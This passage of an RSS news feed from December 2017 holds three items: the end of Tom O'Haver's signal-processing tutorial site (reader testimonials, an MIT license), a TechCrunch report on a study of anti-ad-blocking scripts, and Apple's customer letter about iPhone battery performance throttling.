&lt;h4&gt;&lt;big&gt;&quot;I ... have never seen before (I have years of experience in this field) such a &lt;span&gt;complete approach&lt;/span&gt; towards tackling almost all the analysis problems from scratch....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I like your writing style because it's &lt;span&gt;clear and concise&lt;/span&gt;, and your prose flows so smoothly.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;The signal processing topics you cover are so &lt;span&gt;wonderfully practical...truly impressive&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I ... am &lt;span&gt;very impressed with the clarity&lt;/span&gt; of the presentation.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;... truly &lt;span&gt;one of best&lt;/span&gt; practical description I have ever seen.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I&lt;/big&gt; &lt;big&gt;liked the way everything is setup and explained.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...I think it's the &lt;span&gt;best explanation I've ever seen&lt;/span&gt;. &quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;excellent&lt;/span&gt; documentation and coding....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...thank you for the &lt;span&gt;immense role&lt;/span&gt; your book has played in my perusal of research....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;This is...a &lt;span&gt;teaching paradise&lt;/span&gt;..&lt;big&gt;.&lt;/big&gt;&lt;/span&gt;&lt;big&gt;&lt;span&gt;&lt;small&gt;really &lt;span&gt;priceless&lt;/span&gt;.&lt;/small&gt;&lt;/span&gt;&lt;/big&gt;&lt;span&gt;&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;&lt;span&gt;What you do makes the world better!&lt;/span&gt;&quot;&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your explanation....very &lt;span&gt;simple and clear&lt;/span&gt;. &quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;I was really &lt;span&gt;surprised&lt;/span&gt; by the efficiency of your explanations ...&quot;&lt;span&gt;highly realistic and pragmatic&lt;/span&gt;.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;The sequence of the topics and the explanations are &lt;span&gt;very clear&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I found your curve fitting website and it is &lt;span&gt;awesome&lt;/span&gt;....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;&lt;span&gt;Love&lt;/span&gt; your web pages.... MANY thanks for all the effort, hard work and time -- not to mention the &lt;span&gt;clarity&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;This site is &lt;span&gt;tremendous&lt;/span&gt;....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...[an] &lt;span&gt;indispensable&lt;/span&gt; tool....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...I'm &lt;span&gt;astonished&lt;/span&gt; by your work.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your &lt;span&gt;fantastic&lt;/span&gt; article...has helped me a lot&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...it is an &lt;span&gt;absolutely fantastic&lt;/span&gt; teaching resource.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your Intro. to Signal Proc. book and software ... [is] ... &lt;span&gt;helpful and thorough&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Thanks again for your generous contributions to the scientific and engineering community, you might not get a lot of feedback (or hopefully you do) but your work is greatly appreciated and will continue to benefit us for years to come.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your website...represents a &lt;span&gt;wonderful&lt;/span&gt; job....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...such an enormous amount of knowledge and applied code! It is an &lt;span&gt;enormous help&lt;/span&gt; for analysing my data.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...an &lt;span&gt;excellent source of information&lt;/span&gt; for a subject that I have only encountered scatterered books.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...thank you profusely .... your website has been &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...after days of trying and failing...your site &lt;span&gt;was able to solve my problem in half an hour&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;I have no words to describe how helpful this is to me ... explaining what they do and how they can be used; on top the examples make it even better.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;... &lt;em&gt;surely &lt;span&gt;the way into heaven&lt;/span&gt;&lt;/em&gt; &lt;em&gt;is to post excellent software online for others to use to do science.&lt;/em&gt;&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...thank you for taking the time to create these &lt;span&gt;incredible&lt;/span&gt; tools.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;I am grateful and &lt;span&gt;overwhelmed&lt;/span&gt; by your kindness in sharing your hard work with us&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;This is a &lt;span&gt;great&lt;/span&gt; website...&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...you &lt;span&gt;saved my time&lt;/span&gt; a lot.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Your effort to produce and maintain this site is &lt;span&gt;GREATLY appreciated&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Your online resource for “signal processing” is &lt;span&gt;fantastic!&lt;/span&gt;&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot; I found your essay to be &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...such &lt;span&gt;useful&lt;/span&gt; tools and educational materials!&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your webpage about signal processing ... was &lt;span&gt;very helpful&lt;/span&gt; to me.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;great material&lt;/span&gt; on the subject.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...very much &lt;span&gt;helping and informative&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;&lt;span&gt;Wonderful&lt;/span&gt; site. I have already added it to my favorites.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Your web pages are a &lt;span&gt;fantastic resource&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your signal processing website, book, and Matlab codes ... embodied &lt;span&gt;the solution I was searching for&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot; I cannot wait to start class and utilize the &lt;span&gt;marvelous&lt;/span&gt; tool that you have provided for us.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Without your website, I wouldn't know what to do.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot; ... a &lt;span&gt;splendid&lt;/span&gt; program.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...really an &lt;span&gt;excellent&lt;/span&gt; source of information....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;I find your work on Signal Processing &lt;span&gt;extremely helpful&lt;/span&gt;....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;easy to use and understand&lt;/span&gt;...&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;...&lt;span&gt;saved me many hours&lt;/span&gt; of work....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;big&gt;&quot;I am so thankful for your website...It has &lt;span&gt;helped me significantly&lt;/span&gt;....&quot;&lt;/big&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;&lt;big&gt;&quot;Thank you so much for this &lt;span&gt;wonderful&lt;/span&gt; teaching tool! &quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;it &lt;span&gt;really helped&lt;/span&gt; me.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;...the tutorials on your website have been of &lt;span&gt;tremendous help&lt;/span&gt; to me.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I find your Introduction an &lt;span&gt;excellent&lt;/span&gt; starting point.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thanks for your &lt;span&gt;amazing&lt;/span&gt; contribution.&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thank you for sharing your &lt;span&gt;excellent&lt;/span&gt; work....&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;...&lt;span&gt;wonderful&lt;/span&gt; tutorial on peak fitting.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I recently found your website and I’m really impressed, &lt;span&gt;great&lt;/span&gt; work! &quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thank you for your time and the &lt;span&gt;wonderful&lt;/span&gt; material (software and text) you have put up on your website.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Your lessons on signal processing are &lt;span&gt;really useful and intriguing&lt;/span&gt;....&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;I have no words to describe how &lt;span&gt;excited&lt;/span&gt; I am and how thankful I am about your work.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your ... website &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your signal processing pages ... &lt;span&gt;very helpful!&lt;/span&gt;&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;I &lt;span&gt;loved&lt;/span&gt; your article on smoothing.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;really clear&lt;/span&gt; and concise.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4/&gt;
&lt;p&gt;&lt;big&gt;&quot; ... &lt;span&gt;very useful&lt;/span&gt; for teaching in an Instrumentation course for M.Sc postgraduates in analytical chemistry.&lt;br/&gt;&lt;/big&gt;&lt;/p&gt;
&lt;p&gt;&lt;big&gt;&quot;[Y]our web site has such &lt;span&gt;excellent&lt;/span&gt; content....&quot;&lt;/big&gt;&lt;/p&gt;
&lt;p&gt;&lt;big&gt;&quot;I tried the demo version of SPECTRUM and I think is a &lt;span&gt;very useful&lt;/span&gt; tool for the introduction of signal processing to analytical chemistry students.&quot;&lt;/big&gt;&lt;/p&gt;
&lt;h4&gt;&quot;&lt;big&gt;Your work is &lt;span&gt;very helpful&lt;/span&gt; to my research.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your site...has some &lt;span&gt;very valuable&lt;/span&gt; information relevant to the projects I’m currently working on.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...really nice tutorial and Matlab functions that are &lt;span&gt;extremely useful&lt;/span&gt; in many fields of research.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Very generous of you to make &lt;span&gt;so much useful material&lt;/span&gt; freely available.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I found your website &lt;span&gt;very informative&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Thank you, Tom, for being a great citizen of MATLAB Central and the File Exchange! You are what makes this community thrive.&quot; (&lt;a href=&quot;http://blogs.mathworks.com/pick/2016/09/09/most-activeinteractive-file-exchange-entry/&quot;&gt;http://blogs.mathworks.com/pick/2016/09/09/most-activeinteractive-file-exchange-entry/&lt;/a&gt;)&lt;/big&gt;&lt;/h4&gt;
&lt;h4/&gt;
&lt;hr/&gt;&lt;p&gt;&lt;big&gt;Copyright (c) 2016, Thomas C. O'Haver (toh@umd.edu)&lt;br/&gt; &lt;br/&gt;Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the &quot;Software&quot;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:&lt;/big&gt;&lt;/p&gt;&lt;p&gt;The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.&lt;/p&gt;&lt;p&gt;THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;a href=&quot;http://terpconnect.umd.edu/%7Etoh/&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Tom.JPG&quot; width=&quot;198&quot; vspace=&quot;6&quot; hspace=&quot;6&quot; height=&quot;241&quot; border=&quot;2&quot;/&gt;&lt;/a&gt;&lt;big/&gt;First edition created in 1995. Last updated December, 2017. Created with &lt;a href=&quot;http://www.seamonkey-project.org/releases/seamonkey2.17.1/&quot;&gt;SeaMonkey&lt;/a&gt;. This site is a &lt;a href=&quot;http://imerrill.umd.edu/facultyvoice1/?p=3231&quot;&gt;retirement project&lt;/a&gt; and &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Countries.html&quot;&gt;international community service&lt;/a&gt;, maintained by &lt;a href=&quot;http://terpconnect.umd.edu/%7Etoh/&quot;&gt;Prof. Tom O'Haver&lt;/a&gt;, Professor Emeritus, &lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Shield2.GIF&quot; width=&quot;56&quot; vspace=&quot;5&quot; hspace=&quot;5&quot; height=&quot;55&quot;/&gt;Department of Chemistry and Biochemistry, The University of Maryland at College Park, currently residing in Naples, FL. Comments, suggestions and questions should be directed to Prof. O'Haver at &lt;a href=&quot;mailto:toh@umd.edu?subject=Index%20to%20Signal%20Processing&quot;&gt;toh@umd.edu&lt;/a&gt;, currently residing in Naples, FL, and in Silver Spring, MD.&lt;br/&gt;&lt;/p&gt;
&lt;hr width=&quot;100%&quot; size=&quot;2&quot;/&gt;&lt;noscript&gt;
&lt;div class=&quot;statcounter&quot;&gt;
&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#Top&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/btt.png&quot; title=&quot;Back to top of this page.&quot; alt=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; border=&quot;0&quot; align=&quot;right&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;/div&gt;
&lt;/noscript&gt;
&lt;h2 align=&quot;center&quot;&gt;A Brief History of Mine&lt;/h2&gt;

&lt;h3&gt;Digital began to pull away from analog in the 1950s and now completely dominates.&lt;/h3&gt;

&lt;h3&gt;In the mid 1990s, Web sites began to dominate earlier publishing technologies.&lt;/h3&gt;

&lt;h3&gt;Transistors, invented in the late 1940s, pulled ahead of vacuum tunes in the 50s. By the early 80s, integrated circuits chips were dominant.&lt;/h3&gt;

&lt;h3&gt;Statistics and quantitative signal and data processing have long been important, using computers after the 1950s.&lt;/h3&gt;

&lt;h3&gt;&quot;Derivative&quot;, &quot;smoothing&quot;, and &quot;convolution&quot; are old concepts, but other signal processing terms don't become common until more recently.&lt;/h3&gt;

&lt;h3&gt;The most common derivative orders have long been the first and second; higher older are much less used.&lt;/h3&gt;

&lt;h3&gt;The Savitzky-Golay smooth is now the most often mentioned data smoothing technique. (What was going on the &quot;triangular smooth&quot; in the 1800s?)&lt;/h3&gt;

&lt;h3&gt;The Gaussian profile is the most commonly encountered peak shape.&lt;/h3&gt;

&lt;h3&gt;Measures of precision in the presence of random noise increased with the availability of electronic instrumentation.&lt;/h3&gt;

&lt;/body&gt;</description>
<pubDate>Fri, 29 Dec 2017 02:06:41 +0000</pubDate>
<dc:creator>lainon</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://terpconnect.umd.edu/~toh/spectrum/</dc:identifier>
</item>
<item>
<title>Many major websites are taking silent anti-ad-blocking measures</title>
<link>https://techcrunch.com/2017/12/27/thousands-of-major-sites-are-taking-silent-anti-ad-blocking-measures/</link>
<guid isPermaLink="true" >https://techcrunch.com/2017/12/27/thousands-of-major-sites-are-taking-silent-anti-ad-blocking-measures/</guid>
<description>&lt;img src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/03/software-vc-money.jpg?w=738&quot; class=&quot;&quot;/&gt;&lt;p id=&quot;speakable-summary&quot;&gt;It’s no secret that ad blockers are putting a dent in advertising-based business models on the web. This has produced a range of reactions, from relatively polite whitelisting asks (TechCrunch does this) to dynamic redeployment of ads to avoid blocking. A new study finds that nearly a third of the top 10,000 sites on the web are taking ad blocking countermeasures, many silent and highly sophisticated.&lt;/p&gt;&lt;p&gt;Seeing the uptick in anti-ad-blocking tech, University of Iowa and UC Riverside researchers &lt;a target=&quot;_blank&quot; href=&quot;http://homepage.divms.uiowa.edu/~mshafiq/files/adblock-ndss2018.pdf&quot; rel=&quot;noopener&quot;&gt;decided to perform a closer scrutiny (PDF)&lt;/a&gt; of major sites than had previously been done. Earlier estimates, based largely on visible or obvious anti-ad-blocking means such as pop-ups or broken content, suggested that somewhere between 1 and 5 percent of popular sites were doing this — but the real number seems to be an order of magnitude higher.&lt;/p&gt;
&lt;p&gt;The researchers visited thousands of sites multiple times, with and without ad-blocking software added to the browser. By comparing the final rendered code of the page for blocking browsers versus non-blocking browsers, they could see when pages changed content or noted the presence of a blocker, even if they didn’t notify the user.&lt;/p&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png&quot; rel=&quot;noopener&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-1581451&quot; src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png?w=598&amp;amp;h=250&quot; alt=&quot;&quot; width=&quot;598&quot; height=&quot;250&quot; srcset=&quot;https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png 598w, https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png?w=150&amp;amp;h=63 150w, https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png?w=300&amp;amp;h=125 300w&quot; sizes=&quot;(max-width: 598px) 100vw, 598px&quot;/&gt;&lt;/a&gt;As you can see above, 30.5 percent of the top 10,000 sites on the web as measured by Alexa are using some sort of ad-blocker detection, and 38.2 percent of the top 1,000. (Again, TechCrunch is among these, but to my knowledge we just ask visitors to whitelist the site.)&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;Our results show that anti-adblockers are much more pervasive than previously reported…our hypothesis is that a much larger fraction of websites than previously reported are “worried” about adblockers but many are not employing retaliatory actions against adblocking users yet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It turns out that many ad providers are offering anti-blocking tech in the form of scripts that produce a variety of “bait” content that’s ad-like — for instance, images or elements named and tagged in such a way that they will trigger ad blockers, tipping the site off. The pattern of blocking, for instance not loading any divs marked “banner_ad” but loading images with “banner” in the description, further illuminates the type and depth of ad blocking being enforced by the browser.&lt;/p&gt;
&lt;p&gt;Sites can simply record this for their own purposes (perhaps to gauge the necessity of responding) or redeploy ads in such a way that the detected ad blocker won’t catch.&lt;/p&gt;

&lt;p&gt;In addition to detecting these new and increasingly common measures being taken by advertisers, the researchers suggest some ways that current ad blockers may be able to continue functioning as intended.&lt;/p&gt;
&lt;p&gt;One way involves dynamically rewriting the JavaScript code that checks for a blocker, forcing it to think there is no blocker. However, this could break some sites that render as if there is no blocker when there actually is.&lt;/p&gt;
&lt;p&gt;A second method identifies the “bait” content and fails to block it, making the site think there’s no blocker in the browser and therefore render ads as normal — except the real ads &lt;em&gt;will&lt;/em&gt; be blocked.&lt;/p&gt;
&lt;p&gt;That will, of course, provoke new and even more sophisticated measures by the advertisers, and so on. As the paper concludes:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;To keep up the pressure on publishers and advertisers in the long term, we believe it is crucial that adblockers keep pace with anti-adblockers in the rapidly escalating technological arms race. Our work represents an important step in this direction.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The study has been submitted for consideration at the Network and Distributed Systems Security Symposium in February of 2018.&lt;/p&gt;
&lt;small&gt;Featured Image: Bryce Durbin&lt;/small&gt;</description>
<pubDate>Thu, 28 Dec 2017 21:57:22 +0000</pubDate>
<dc:creator>ytNumbers</dc:creator>
<og:title>Thousands of major sites are taking silent anti-ad-blocking measures</og:title>
<og:description>It's no secret that ad blockers are putting a dent in advertising-based business models on the web. This has produced a range of reactions, from relatively..</og:description>
<og:image>https://tctechcrunch2011.files.wordpress.com/2017/03/software-vc-money.jpg</og:image>
<og:url>http://social.techcrunch.com/2017/12/27/thousands-of-major-sites-are-taking-silent-anti-ad-blocking-measures/</og:url>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2017/12/27/thousands-of-major-sites-are-taking-silent-anti-ad-blocking-measures/</dc:identifier>
</item>
<item>
<title>A Message to Our Customers about iPhone Batteries and Performance</title>
<link>https://www.apple.com/iphone-battery-and-performance/</link>
<guid isPermaLink="true" >https://www.apple.com/iphone-battery-and-performance/</guid>
<description>&lt;h2 class=&quot;typography-eyebrow-reduced&quot;&gt;December 28, 2017&lt;/h2&gt;

&lt;p&gt;We’ve been hearing feedback from our customers about the way we handle performance for iPhones with older batteries and how we have communicated that process. We know that some of you feel Apple has let you down. We apologize. There’s been a lot of misunderstanding about this issue, so we would like to clarify and let you know about some changes we’re making.&lt;/p&gt;
&lt;p&gt;First and foremost, we have never — and would never — do anything to intentionally shorten the life of any Apple product, or degrade the user experience to drive customer upgrades. Our goal has always been to create products that our customers love, and making iPhones last as long as possible is an important part of that.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;How batteries age&lt;/h3&gt;
&lt;p&gt;All rechargeable batteries are consumable components that become less effective as they chemically age and their ability to hold a charge diminishes. Time and the number of times a battery has been charged are not the only factors in this chemical aging process.&lt;/p&gt;
&lt;p&gt;Device use also affects the performance of a battery over its lifespan. For example, leaving or charging a battery in a hot environment can cause a battery to age faster. These are characteristics of battery chemistry, common to lithium-ion batteries across the industry.&lt;/p&gt;
&lt;p&gt;A chemically aged battery also becomes less capable of delivering peak energy loads, especially in a low state of charge, which may result in a device unexpectedly shutting itself down in some situations.&lt;/p&gt;
&lt;p&gt;To help customers learn more about iPhone’s rechargeable battery and the factors affecting its performance, we’ve posted a new support article, &lt;a href=&quot;https://support.apple.com/HT208387&quot;&gt;iPhone Battery and Performance&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It should go without saying that we think sudden, unexpected shutdowns are unacceptable. We don’t want any of our users to lose a call, miss taking a picture or have any other part of their iPhone experience interrupted if we can avoid it.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;Preventing unexpected shutdowns&lt;/h3&gt;
&lt;p&gt;About a year ago in iOS 10.2.1, we delivered a software update that improves power management during peak workloads to avoid unexpected shutdowns on iPhone 6, iPhone 6 Plus, iPhone 6s, iPhone 6s Plus, and iPhone SE. With the update, iOS dynamically manages the maximum performance of some system components when needed to prevent a shutdown. While these changes may go unnoticed, in some cases users may experience longer launch times for apps and other reductions in performance.&lt;/p&gt;
&lt;p&gt;Customer response to iOS 10.2.1 was positive, as it successfully reduced the occurrence of unexpected shutdowns. We recently extended the same support for iPhone 7 and iPhone 7 Plus in iOS 11.2.&lt;/p&gt;
&lt;p&gt;Of course, when a chemically aged battery is replaced with a new one, iPhone performance returns to normal when operated in standard conditions.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;Recent user feedback&lt;/h3&gt;
&lt;p&gt;Over the course of this fall, we began to receive feedback from some users who were seeing slower performance in certain situations. Based on our experience, we initially thought this was due to a combination of two factors: a normal, temporary performance impact when upgrading the operating system as iPhone installs new software and updates apps, and minor bugs in the initial release which have since been fixed.&lt;/p&gt;
&lt;p&gt;We now believe that another contributor to these user experiences is the continued chemical aging of the batteries in older iPhone 6 and iPhone 6s devices, many of which are still running on their original batteries.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;Addressing customer concerns&lt;/h3&gt;
&lt;p&gt;We’ve always wanted our customers to be able to use their iPhones as long as possible. We’re proud that Apple products are known for their durability, and for holding their value longer than our competitors’ devices.&lt;/p&gt;
&lt;p&gt;To address our customers’ concerns, to recognize their loyalty and to regain the trust of anyone who may have doubted Apple’s intentions, we’ve decided to take the following steps:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Apple is reducing the price of an out-of-warranty iPhone battery replacement by $50 — from $79 to $29 — for anyone with an iPhone 6 or later whose battery needs to be replaced, available worldwide through December 2018. Details will be provided soon on &lt;a href=&quot;https://www.apple.com/&quot;&gt;apple.com&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Early in 2018, we will issue an iOS software update with new features that give users more visibility into the health of their iPhone’s battery, so they can see for themselves if its condition is affecting performance.&lt;/li&gt;
&lt;li&gt;As always, our team is working on ways to make the user experience even better, including improving how we manage performance and avoid unexpected shutdowns as batteries age.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;At Apple, our customers’ trust means everything to us. We will never stop working to earn and maintain it. We are able to do the work we love only because of your faith and support — and we will never forget that or take it for granted.&lt;/p&gt;
</description>
<pubDate>Thu, 28 Dec 2017 21:39:37 +0000</pubDate>
<dc:creator>jayachdee</dc:creator>
<og:image>https://www.apple.com/ac/structured-data/images/open_graph_logo.png?201712292257</og:image>
<og:title>A Message to Our Customers</og:title>
<og:description>An important message to our customers regarding iPhone battery and performance.</og:description>
<og:url>https://www.apple.com/iphone-battery-and-performance/</og:url>
<og:type>website</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.apple.com/iphone-battery-and-performance/</dc:identifier>
</item>
</channel>
</rss>